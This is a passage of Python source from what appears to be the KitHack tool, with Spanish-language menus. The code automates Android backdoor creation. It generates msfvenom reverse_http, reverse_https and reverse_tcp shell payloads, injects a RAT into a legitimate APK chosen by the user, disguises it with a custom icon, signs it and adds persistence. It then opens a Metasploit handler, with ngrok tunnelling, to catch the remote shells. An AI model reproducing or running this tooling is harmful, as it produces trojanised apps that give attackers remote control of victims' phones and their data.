							os.system('systemctl start postgresql && msfvenom -x {0} -p android/shell/reverse_http LHOST={1} LPORT={2} > output/{3}.apk'.format(APK, LHOST, LPORT, mainout))																				
							location = os.getcwd()
							if os.stat('output/{}.apk'.format(mainout)).st_size != 0:
								while var.upper() != "N":
									print("\n{0}[*] Generating persistence file...{1}".format(GREEN, DEFAULT))
									time.sleep(4)				 								
									ext = mainout + '.apk'
									subprocess.Popen(['bash', '-c', '. lib/apkf.sh; pers output/' + ext])
									print("{0}File: {1}/output/{2}.sh".format(DEFAULT, location, mainout))	
									break							
								print("\n{0}[✔] Done.\n{1}Backdoor: {2}/output/{3}.apk".format(GREEN, DEFAULT, location, mainout))	
								if input("\n{0}[!] ¿Desea ejecutar msfconsole? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
									os.system('systemctl stop postgresql && clear')
									main()	
								else:
									if not ".tcp.ngrok.io" in LHOST:
										os.system('xterm -T "METASPOIT-CONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD android/shell/reverse_http; exploit\'"'.format(LHOST, LPORT))
										pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
										os.system('systemctl stop postgresql && clear')
										main()	
									else:
										os.system('xterm -T "METASPOIT-CONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST 127.0.0.1; set LPORT 443; set PAYLOAD android/shell/reverse_http; exploit\'"')
										pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
										os.system('systemctl stop postgresql && clear')
										main()	
							else:
								print("\n{0}[X] ERROR AL GENERAR SU BACKDOOR\n".format(RED))
								time.sleep(3)
								pause("{}Presione cualquier tecla para continuar...".format(GREEN))
								os.system('systemctl stop postgresql && clear')
								main()		

						elif m == '02':
							run_network()
							LHOST = input("\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
							LPORT = input("\n{0}SET LPORT: {1}".format(YELLOW, DEFAULT))
							Tk().withdraw()
							APK = filedialog.askopenfilename(title = "KITHACK - SELECT APK ORIGINAL",filetypes = (("apk files","*.apk"),("all files","*.*")))
							print("\n{0}APK ORIGINAL: {1}".format(YELLOW, APK))
							OUT = input("\n{0}Ingrese un nombre para su archivo de salida: {1}".format(YELLOW, DEFAULT))
							mainout = os.path.splitext(OUT)[0]
							var = input("\n{0}[!] ¿Desea crear persistencia a su APK? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT))
							print("\n{0}[*] Generating payload...{1}".format(GREEN, DEFAULT))	
							time.sleep(4)
							os.system('systemctl start postgresql && msfvenom -p android/shell/reverse_http LPORT={0} LHOST={1} R > output/payload.apk'.format(LPORT, LHOST))
							location = os.getcwd()
							print("{0}[*] Decompiling original APK...{1}".format(GREEN, DEFAULT))						
							time.sleep(4)
							os.system('cp {0} {1}/output/original.apk && apktool d -f -o output/original output/original.apk'.format(APK, location))
							print("\n{0}[*] Decompiling payload APK...{1}".format(GREEN, DEFAULT))						
							time.sleep(4)
							os.system('apktool d -f -o output/payload output/payload.apk')
							print("\n{0}[*] Configuring RAT Payload...{1}".format(GREEN, DEFAULT))		
							time.sleep(4)				
							subprocess.Popen(['bash', '-c', '. lib/apkf.sh; rat'])
							print("\n{0}[*] Compiling RAT APK...{1}".format(GREEN, DEFAULT))		
							time.sleep(4)
							os.system('apktool b output/original -o output/kithack.apk')
							if os.path.isfile('output/kithack.apk'):
								print("\n{0}[*] Signing APK...{1}".format(GREEN, DEFAULT))	
								time.sleep(4)
								os.system('jarsigner -keystore certificate.keystore -storepass android -keypass android -digestalg SHA1 -sigalg MD5withRSA output/kithack.apk android')	
								time.sleep(4)
								os.system('zipalign 4 output/kithack.apk output/{0}.apk'.format(mainout))
								while var.upper() != "N":
									print("\n{0}[*] Generating persistence file...{1}".format(GREEN, DEFAULT))
									time.sleep(4)				 								
									ext = mainout + '.apk'
									subprocess.Popen(['bash', '-c', '. lib/apkf.sh; pers output/' + ext])
									print("{0}File: {1}/output/{2}.sh".format(DEFAULT, location, mainout))	
									break							
								print("\n{0}[*] Deleting temporary files...{1}".format(GREEN, DEFAULT))
								time.sleep(4)
								os.system('rm -rf output/original output/payload output/original.apk output/payload.apk output/kithack.apk')
								print("\n{0}[✔] Done.\n{1}Backdoor: {2}/output/{3}.apk".format(GREEN, DEFAULT, location, mainout))	
								if input("\n{0}[!] ¿Desea ejecutar msfconsole? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
									os.system('systemctl stop postgresql && clear')
									main()								
								else:
									if not ".tcp.ngrok.io" in LHOST:
										os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD android/shell/reverse_http; exploit\'"'.format(LHOST, LPORT))
										pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
										os.system('systemctl stop postgresql && clear')
										main()	
									else:
										os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST 127.0.0.1; set LPORT 443; set PAYLOAD android/shell/reverse_http; exploit\'"')
										pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
										os.system('systemctl stop postgresql && clear')
										main()	
							else:
								print("\n{0}[X] ERROR AL GENERAR SU BACKDOOR\n".format(RED))
								time.sleep(3)
								os.system('rm -rf output/original output/payload output/original.apk output/payload.apk output/kithack.apk')							
								pause("{}Presione cualquier tecla para continuar...".format(GREEN))
								os.system('systemctl stop postgresql && clear')
								main()	
						
						else:
							print("{}\n[X] OPCION INVALIDA\n".format(RED))
							time.sleep(3)
							pause("{}Presione cualquier tecla para continuar...".format(GREEN))
							os.system('clear')
							main()	

					else:
						print("\n{}[X] OPCION INVALIDA\n".format(RED))
						time.sleep(3)
						pause("{}Presione cualquier tecla para continuar...".format(GREEN))
						os.system('clear')
						main()	

			elif pay == '06':
					print ('{0}\n [*] {1}Select APK Type:\n'.format(DEFAULT, GREEN))
					print ('{0}[01]{1} APK MSF'.format(WHITE, YELLOW))
					print ('{0}[02]{1} APK ORIGINAL'.format(WHITE, YELLOW))
					
					a = input("{0}KitHack >> {1}".format(RED, DEFAULT))
					a = a.zfill(2)

					if a == '01':
						run_network()
						LHOST = input("\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
						LPORT = input("\n{0}SET LPORT: {1}".format(YELLOW, DEFAULT))
						while input("\n{0}[!] ¿Desea modificar el nombre/icono predeterminados? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":  
							break
						else:
							Tk().withdraw()
							icon = filedialog.askopenfilename(title = "KITHACK - SELECT ICON PNG",filetypes = (("png files","*.png"),("all files","*.*")))
							print("\n{0}ICON: {1}".format(YELLOW, icon))						
							OUT = input("\n{0}Ingrese un nombre para su archivo de salida: {1}".format(YELLOW, DEFAULT))						
							mainout = os.path.splitext(OUT)[0]	
							var = input("\n{0}[!] ¿Desea crear persistencia a su APK? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT))
							file = open("/tmp/data.txt", "w")
							file.write(icon + '\n')
							file.write(mainout)
							file.close()
							print("\n{0}[*] Generating backdoor...{1}".format(GREEN, DEFAULT))
							time.sleep(4)
							os.system('systemctl start postgresql && msfvenom -p android/shell/reverse_https LHOST={0} LPORT={1} R > output/payload.apk'.format(LHOST, LPORT))																				
							print("{0}[*] Decompiling APK...{1}".format(GREEN, DEFAULT))
							time.sleep(4)						
							os.system('apktool d -f -o output/payload output/payload.apk')
							print("\n{0}[*] Configuring icon change...{1}".format(GREEN, DEFAULT))
							time.sleep(4)
							subprocess.Popen(['bash', '-c', '. lib/apkf.sh; icon']) 
							print("\n{0}[*] Compiling RAT APK...{1}".format(GREEN, DEFAULT))		
							time.sleep(4)
							os.system('apktool b output/payload -o output/kithack.apk')
							location = os.getcwd()
							if os.path.isfile('output/kithack.apk'):
								print("\n{0}[*] Signing APK...{1}".format(GREEN, DEFAULT))	
								time.sleep(4)
								os.system('jarsigner -keystore certificate.keystore -storepass android -keypass android -digestalg SHA1 -sigalg MD5withRSA output/kithack.apk android')	
								time.sleep(4)
								os.system('zipalign 4 output/kithack.apk output/{0}.apk'.format(mainout))
								while var.upper() != "N":
									print("\n{0}[*] Generating persistence file...{1}".format(GREEN, DEFAULT))
									time.sleep(4)				 								
									ext = mainout + '.apk'
									subprocess.Popen(['bash', '-c', '. lib/apkf.sh; pers output/' + ext])
									print("{0}File: {1}/output/{2}.sh".format(DEFAULT, location, mainout))	
									break							
								print("\n{0}[*] Deleting temporary files...{1}".format(GREEN, DEFAULT))
								time.sleep(4)
								os.system('rm -rf output/payload output/payload.apk output/kithack.apk')
								print("\n{0}[✔] Done.\n{1}Backdoor: {2}/output/{3}.apk".format(GREEN, DEFAULT, location, mainout))	
								if input("\n{0}[!] ¿Desea ejecutar msfconsole? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
									os.system('systemctl stop postgresql && clear')
									main()	
								else:
									if not ".tcp.ngrok.io" in LHOST:
										os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD android/shell/reverse_https; exploit\'"'.format(LHOST, LPORT))
										pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
										os.system('systemctl stop postgresql && clear')
										main()	
									else:
										os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST 127.0.0.1; set LPORT 443; set PAYLOAD android/shell/reverse_https; exploit\'"')
										pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
										os.system('systemctl stop postgresql && clear')
										main()	
							else:
								print("\n{0}[X] ERROR AL GENERAR SU BACKDOOR\n".format(RED))
								time.sleep(3)
								os.system('rm -rf output/payload output/payload.apk output/kithack.apk')							
								pause("{}Presione cualquier tecla para continuar...".format(GREEN))
								os.system('systemctl stop postgresql && clear')
								main()

						# Salida de bucle					
						OUT = input("\n{0}Ingrese un nombre para su archivo de salida: {1}".format(YELLOW, DEFAULT))						
						mainout = os.path.splitext(OUT)[0]
						var = input("\n{0}[!] ¿Desea crear persistencia a su APK? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT))
						print("\n{0}[*] Generating backdoor...{1}".format(GREEN, DEFAULT))
						time.sleep(4)
						os.system('systemctl start postgresql && msfvenom -p android/shell/reverse_https LHOST={0} LPORT={1} R > output/{2}.apk'.format(LHOST, LPORT, mainout))																				
						location = os.getcwd()
						if os.stat('output/{}.apk'.format(mainout)).st_size != 0:
							while var.upper() != "N":
								print("\n{0}[*] Generating persistence file...{1}".format(GREEN, DEFAULT))
								time.sleep(4)				 								
								ext = mainout + '.apk'
								subprocess.Popen(['bash', '-c', '. lib/apkf.sh; pers output/' + ext])
								print("{0}File: {1}/output/{2}.sh".format(DEFAULT, location, mainout))	
								break						
							print("\n{0}[✔] Done.\n{1}Backdoor: {2}/output/{3}.apk".format(GREEN, DEFAULT, location, mainout))	
							if input("\n{0}[!] ¿Desea ejecutar msfconsole? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
								os.system('systemctl stop postgresql && clear')
								main()	
							else:
								if not ".tcp.ngrok.io" in LHOST:
									os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD android/shell/reverse_https; exploit\'"'.format(LHOST, LPORT))
									pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
									os.system('systemctl stop postgresql && clear')
									main()	
								else:
									os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST 127.0.0.1; set LPORT 443; set PAYLOAD android/shell/reverse_https; exploit\'"')
									pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
									os.system('systemctl stop postgresql && clear')
									main()	
						else:
							print("\n{0}[X] ERROR AL GENERAR SU BACKDOOR\n".format(RED))
							time.sleep(3)
							pause("{}Presione cualquier tecla para continuar...".format(GREEN))
							os.system('systemctl stop postgresql && clear')
							main()	
					
					elif a == '02':
						print ('{0}\n [*] {1}Select Method:\n'.format(DEFAULT, GREEN))
						print ('{0}[01]{1} Use the old Metasploit method'.format(WHITE, YELLOW))
						print ('{0}[02]{1} Use the new KitHack method'.format(WHITE, YELLOW))

						m = input("{0}KitHack >> {1}".format(RED, DEFAULT))
						m = m.zfill(2)

						if m == '01':
							run_network()
							LHOST = input("\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
							LPORT = input("\n{0}SET LPORT: {1}".format(YELLOW, DEFAULT))
							Tk().withdraw()
							APK = filedialog.askopenfilename(title = "KITHACK - SELECT APK ORIGINAL",filetypes = (("apk files","*.apk"),("all files","*.*")))
							print("\n{0}APK ORIGINAL: {1}".format(YELLOW, APK))
							OUT = input("\n{0}Ingrese un nombre para su archivo de salida: {1}".format(YELLOW, DEFAULT))
							mainout = os.path.splitext(OUT)[0]
							var = input("\n{0}[!] ¿Desea crear persistencia a su APK? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT))
							print("\n{0}[*] Generating backdoor...{1}".format(GREEN, DEFAULT))	
							time.sleep(4)
							os.system('systemctl start postgresql && msfvenom -x {0} -p android/shell/reverse_https LHOST={1} LPORT={2} > output/{3}.apk'.format(APK, LHOST, LPORT, mainout))																				
							location = os.getcwd()
							if os.stat('output/{}.apk'.format(mainout)).st_size != 0:	
								while var.upper() != "N":
									print("\n{0}[*] Generating persistence file...{1}".format(GREEN, DEFAULT))
									time.sleep(4)				 								
									ext = mainout + '.apk'
									subprocess.Popen(['bash', '-c', '. lib/apkf.sh; pers output/' + ext])
									print("{0}File: {1}/output/{2}.sh".format(DEFAULT, location, mainout))	
									break							
								print("\n{0}[✔] Done.\n{1}Backdoor: {2}/output/{3}.apk".format(GREEN, DEFAULT, location, mainout))	
								if input("\n{0}[!] ¿Desea ejecutar msfconsole? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
									os.system('systemctl stop postgresql && clear')
									main()	
								else:
									if not ".tcp.ngrok.io" in LHOST:
										os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD android/shell/reverse_https; exploit\'"'.format(LHOST, LPORT))
										pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
										os.system('systemctl stop postgresql && clear')
										main()	
									else:
										os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST 127.0.0.1; set LPORT 443; set PAYLOAD android/shell/reverse_https; exploit\'"')
										pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
										os.system('systemctl stop postgresql && clear')
										main()	
							else:
								print("\n{0}[X] ERROR AL GENERAR SU BACKDOOR\n".format(RED))
								time.sleep(3)
								pause("{}Presione cualquier tecla para continuar...".format(GREEN))
								os.system('systemctl stop postgresql && clear')
								main()	

						elif m == '02':
							run_network()
							LHOST = input("\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
							LPORT = input("\n{0}SET LPORT: {1}".format(YELLOW, DEFAULT))
							Tk().withdraw()
							APK = filedialog.askopenfilename(title = "KITHACK - SELECT APK ORIGINAL",filetypes = (("apk files","*.apk"),("all files","*.*")))
							print("\n{0}APK ORIGINAL: {1}".format(YELLOW, APK))
							OUT = input("\n{0}Ingrese un nombre para su archivo de salida: {1}".format(YELLOW, DEFAULT))
							mainout = os.path.splitext(OUT)[0]
							var = input("\n{0}[!] ¿Desea crear persistencia a su APK? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT))
							print("\n{0}[*] Generating payload...{1}".format(GREEN, DEFAULT))	
							time.sleep(4)
							os.system('systemctl start postgresql && msfvenom -p android/shell/reverse_https LPORT={0} LHOST={1} R > output/payload.apk'.format(LPORT, LHOST))
							location = os.getcwd()
							print("{0}[*] Decompiling original APK...{1}".format(GREEN, DEFAULT))						
							time.sleep(4)
							os.system('cp {0} {1}/output/original.apk && apktool d -f -o output/original output/original.apk'.format(APK, location))
							print("\n{0}[*] Decompiling payload APK...{1}".format(GREEN, DEFAULT))						
							time.sleep(4)
							os.system('apktool d -f -o output/payload output/payload.apk')
							print("\n{0}[*] Configuring RAT Payload...{1}".format(GREEN, DEFAULT))		
							time.sleep(4)				
							subprocess.Popen(['bash', '-c', '. lib/apkf.sh; rat'])
							print("\n{0}[*] Compiling RAT APK...{1}".format(GREEN, DEFAULT))		
							time.sleep(4)
							os.system('apktool b output/original -o output/kithack.apk')
							if os.path.isfile('output/kithack.apk'):
								print("\n{0}[*] Signing APK...{1}".format(GREEN, DEFAULT))	
								time.sleep(4)
								os.system('jarsigner -keystore certificate.keystore -storepass android -keypass android -digestalg SHA1 -sigalg MD5withRSA output/kithack.apk android')	
								time.sleep(4)
								os.system('zipalign 4 output/kithack.apk output/{0}.apk'.format(mainout))
								while var.upper() != "N":
									print("\n{0}[*] Generating persistence file...{1}".format(GREEN, DEFAULT))
									time.sleep(4)				 								
									ext = mainout + '.apk'
									subprocess.Popen(['bash', '-c', '. lib/apkf.sh; pers output/' + ext])
									print("{0}File: {1}/output/{2}.sh".format(DEFAULT, location, mainout))	
									break							
								print("\n{0}[*] Deleting temporary files...{1}".format(GREEN, DEFAULT))
								time.sleep(4)
								os.system('rm -rf output/original output/payload output/original.apk output/payload.apk output/kithack.apk')
								print("\n{0}[✔] Done.\n{1}Backdoor: {2}/output/{3}.apk".format(GREEN, DEFAULT, location, mainout))	
								if input("\n{0}[!] ¿Desea ejecutar msfconsole? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
									os.system('systemctl stop postgresql && clear')
									main()	
								else:
									if not ".tcp.ngrok.io" in LHOST:
										os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD android/shell/reverse_https; exploit\'"'.format(LHOST, LPORT))
										pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
										os.system('systemctl stop postgresql && clear')
										main()	
									else:
										os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST 127.0.0.1; set LPORT 443; set PAYLOAD android/shell/reverse_https; exploit\'"')
										pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
										os.system('systemctl stop postgresql && clear')
										main()	
							else:
								print("\n{0}[X] ERROR AL GENERAR SU BACKDOOR\n".format(RED))
								time.sleep(3)
								os.system('rm -rf output/original output/payload output/original.apk output/payload.apk output/kithack.apk')							
								pause("{}Presione cualquier tecla para continuar...".format(GREEN))
								os.system('systemctl stop postgresql && clear')
								main()	

						else:
							print("{}\n[X] OPCION INVALIDA\n".format(RED))
							time.sleep(3)
							pause("{}Presione cualquier tecla para continuar...".format(GREEN))
							os.system('clear')
							main()	

					else:
						print("\n{}[X] OPCION INVALIDA\n".format(RED))
						time.sleep(3)
						pause("{}Presione cualquier tecla para continuar...".format(GREEN))
						os.system('clear')
						main()	

			elif pay == '07':
					print ('{0}\n [*] {1}Select APK Type:\n'.format(DEFAULT, GREEN))
					print ('{0}[01]{1} APK MSF'.format(WHITE, YELLOW))
					print ('{0}[02]{1} APK ORIGINAL'.format(WHITE, YELLOW))
					
					a = input("{0}KitHack >> {1}".format(RED, DEFAULT))
					a = a.zfill(2)

					if a == '01':
						run_network()
						LHOST = input("\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
						LPORT = input("\n{0}SET LPORT: {1}".format(YELLOW, DEFAULT))
						while input("\n{0}[!] ¿Desea modificar el nombre/icono predeterminados? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":  
							break
						else:
							Tk().withdraw()
							icon = filedialog.askopenfilename(title = "KITHACK - SELECT ICON PNG",filetypes = (("png files","*.png"),("all files","*.*")))
							print("\n{0}ICON: {1}".format(YELLOW, icon))						
							OUT = input("\n{0}Ingrese un nombre para su archivo de salida: {1}".format(YELLOW, DEFAULT))						
							mainout = os.path.splitext(OUT)[0]	
							var = input("\n{0}[!] ¿Desea crear persistencia a su APK? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT))
							file = open("/tmp/data.txt", "w")
							file.write(icon + '\n')
							file.write(mainout)
							file.close()
							print("\n{0}[*] Generating backdoor...{1}".format(GREEN, DEFAULT))
							time.sleep(4)
							os.system('systemctl start postgresql && msfvenom -p android/shell/reverse_tcp LHOST={0} LPORT={1} R > output/payload.apk'.format(LHOST, LPORT))																				
							print("{0}[*] Decompiling APK...{1}".format(GREEN, DEFAULT))
							time.sleep(4)						
							os.system('apktool d -f -o output/payload output/payload.apk')
							print("\n{0}[*] Configuring icon change...{1}".format(GREEN, DEFAULT))
							time.sleep(4)
							subprocess.Popen(['bash', '-c', '. lib/apkf.sh; icon']) 
							print("\n{0}[*] Compiling RAT APK...{1}".format(GREEN, DEFAULT))		
							time.sleep(4)
							os.system('apktool b output/payload -o output/kithack.apk')
							location = os.getcwd()
							if os.path.isfile('output/kithack.apk'):
								print("\n{0}[*] Signing APK...{1}".format(GREEN, DEFAULT))	
								time.sleep(4)
								os.system('jarsigner -keystore certificate.keystore -storepass android -keypass android -digestalg SHA1 -sigalg MD5withRSA output/kithack.apk android')	
								time.sleep(4)
								os.system('zipalign 4 output/kithack.apk output/{0}.apk'.format(mainout))
								while var.upper() != "N":
									print("\n{0}[*] Generating persistence file...{1}".format(GREEN, DEFAULT))
									time.sleep(4)				 								
									ext = mainout + '.apk'
									subprocess.Popen(['bash', '-c', '. lib/apkf.sh; pers output/' + ext])
									print("{0}File: {1}/output/{2}.sh".format(DEFAULT, location, mainout))	
									break							
								print("\n{0}[*] Deleting temporary files...{1}".format(GREEN, DEFAULT))
								time.sleep(4)
								os.system('rm -rf output/payload output/payload.apk output/kithack.apk')
								print("\n{0}[✔] Done.\n{1}Backdoor: {2}/output/{3}.apk".format(GREEN, DEFAULT, location, mainout))	
								if input("\n{0}[!] ¿Desea ejecutar msfconsole? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
									os.system('systemctl stop postgresql && clear')
									main()	
								else:
									if not ".tcp.ngrok.io" in LHOST:
										os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD android/shell/reverse_tcp; exploit\'"'.format(LHOST, LPORT))
										pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
										os.system('systemctl stop postgresql && clear')
										main()	
									else:
										os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST 127.0.0.1; set LPORT 443; set PAYLOAD android/shell/reverse_tcp; exploit\'"')
										pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
										os.system('systemctl stop postgresql && clear')
										main()	
							else:
								print("\n{0}[X] ERROR AL GENERAR SU BACKDOOR\n".format(RED))
								time.sleep(3)
								os.system('rm -rf output/payload output/payload.apk output/kithack.apk')							
								pause("{}Presione cualquier tecla para continuar...".format(GREEN))
								os.system('systemctl stop postgresql && clear')
								main()

						# Salida de bucle
						OUT = input("\n{0}Ingrese un nombre para su archivo de salida: {1}".format(YELLOW, DEFAULT))						
						mainout = os.path.splitext(OUT)[0]
						var = input("\n{0}[!] ¿Desea crear persistencia a su APK? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT))
						print("\n{0}[*] Generating backdoor...{1}".format(GREEN, DEFAULT))
						time.sleep(4)
						os.system('systemctl start postgresql && msfvenom -p android/shell/reverse_tcp LHOST={0} LPORT={1} R > output/{2}.apk'.format(LHOST, LPORT, mainout))																				
						location = os.getcwd()
						if os.stat('output/{}.apk'.format(mainout)).st_size != 0:	
							while var.upper() != "N":
								print("\n{0}[*] Generating persistence file...{1}".format(GREEN, DEFAULT))
								time.sleep(4)				 								
								ext = mainout + '.apk'
								subprocess.Popen(['bash', '-c', '. lib/apkf.sh; pers output/' + ext])
								print("{0}File: {1}/output/{2}.sh".format(DEFAULT, location, mainout))	
								break						
							print("\n{0}[✔] Done.\n{1}Backdoor: {2}/output/{3}.apk".format(GREEN, DEFAULT, location, mainout))	
							if input("\n{0}[!] ¿Desea ejecutar msfconsole? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
								os.system('systemctl stop postgresql && clear')
								main()	
							else:
								if not ".tcp.ngrok.io" in LHOST:
									os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD android/shell/reverse_tcp; exploit\'"'.format(LHOST, LPORT))
									pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
									os.system('systemctl stop postgresql && clear')
									main()	
								else:
									os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST 127.0.0.1; set LPORT 443; set PAYLOAD android/shell/reverse_tcp; exploit\'"')
									pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
									os.system('systemctl stop postgresql && clear')
									main()	
						else:
							print("\n{0}[X] ERROR AL GENERAR SU BACKDOOR\n".format(RED))
							time.sleep(3)
							pause("{}Presione cualquier tecla para continuar...".format(GREEN))
							os.system('systemctl stop postgresql && clear')
							main()	
				
					elif a == '02':
						print ('{0}\n [*] {1}Select Method:\n'.format(DEFAULT, GREEN))
						print ('{0}[01]{1} Use the old Metasploit method'.format(WHITE, YELLOW))
						print ('{0}[02]{1} Use the new KitHack method'.format(WHITE, YELLOW))

						m = input("{0}KitHack >> {1}".format(RED, DEFAULT))
						m = m.zfill(2)
						
						if m == '01':
							run_network()
							LHOST = input("\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
							LPORT = input("\n{0}SET LPORT: {1}".format(YELLOW, DEFAULT))
							Tk().withdraw()
							APK = filedialog.askopenfilename(title = "KITHACK - SELECT APK ORIGINAL",filetypes = (("apk files","*.apk"),("all files","*.*")))
							print("\n{0}APK ORIGINAL: {1}".format(YELLOW, APK))
							OUT = input("\n{0}Ingrese un nombre para su archivo de salida: {1}".format(YELLOW, DEFAULT))
							mainout = os.path.splitext(OUT)[0]
							var = input("\n{0}[!] ¿Desea crear persistencia a su APK? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT))
							print("\n{0}[*] Generating backdoor...{1}".format(GREEN, DEFAULT))	
							time.sleep(4)
							os.system('systemctl start postgresql && msfvenom -x {0} -p android/shell/reverse_tcp LHOST={1} LPORT={2} > output/{3}.apk'.format(APK, LHOST, LPORT, mainout))																				
							location = os.getcwd()
							if os.stat('output/{}.apk'.format(mainout)).st_size != 0:	
								while var.upper() != "N":
									print("\n{0}[*] Generating persistence file...{1}".format(GREEN, DEFAULT))
									time.sleep(4)				 								
									ext = mainout + '.apk'
									subprocess.Popen(['bash', '-c', '. lib/apkf.sh; pers output/' + ext])
									print("{0}File: {1}/output/{2}.sh".format(DEFAULT, location, mainout))	
									break							
								print("\n{0}[✔] Done.\n{1}Backdoor: {2}/output/{3}.apk".format(GREEN, DEFAULT, location, mainout))	
								if input("\n{0}[!] ¿Desea ejecutar msfconsole? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
									os.system('systemctl stop postgresql && clear')
									main()	
								else:
									if not ".tcp.ngrok.io" in LHOST:
										os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD android/shell/reverse_tcp; exploit\'"'.format(LHOST, LPORT))
										pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
										os.system('systemctl stop postgresql && clear')
										main()	
									else:
										os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST 127.0.0.1; set LPORT 443; set PAYLOAD android/shell/reverse_tcp; exploit\'"')
										pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
										os.system('systemctl stop postgresql && clear')
										main()		
							else:
								print("\n{0}[X] ERROR AL GENERAR SU BACKDOOR\n".format(RED))
								time.sleep(3)
								pause("{}Presione cualquier tecla para continuar...".format(GREEN))
								os.system('systemctl stop postgresql && clear')
								main()		

						elif m == '02':
							run_network()
							LHOST = input("\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
							LPORT = input("\n{0}SET LPORT: {1}".format(YELLOW, DEFAULT))
							Tk().withdraw()
							APK = filedialog.askopenfilename(title = "KITHACK - SELECT APK ORIGINAL",filetypes = (("apk files","*.apk"),("all files","*.*")))
							print("\n{0}APK ORIGINAL: {1}".format(YELLOW, APK))
							OUT = input("\n{0}Ingrese un nombre para su archivo de salida: {1}".format(YELLOW, DEFAULT))
							mainout = os.path.splitext(OUT)[0]
							var = input("\n{0}[!] ¿Desea crear persistencia a su APK? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT))
